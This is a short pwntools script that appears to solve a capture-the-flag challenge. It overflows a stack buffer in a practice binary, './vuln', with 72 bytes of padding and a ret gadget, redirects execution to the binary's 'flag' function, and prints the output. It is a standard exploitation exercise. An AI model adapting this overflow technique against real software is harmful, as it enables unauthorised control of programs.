from pwn import *
import warnings

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Binary filename
exe = './vuln'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'
warnings.filterwarnings('ignore')

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================


# Pass in pattern_size, get back EIP/RIP offset
offset = 72

# Start program
io = start()

padding = "A" * offset
movap = 0x000000000040101a
# Build the payload
payload = flat([
    padding,
    movap,
    elf.functions['flag']
    ])

#write('payload', payload)

# Send the payload
io.sendlineafter(b':', payload)

# Got Flag?
io.recv(100)
print(io.recv(100).decode())
#io.interactive()
io.close()
            
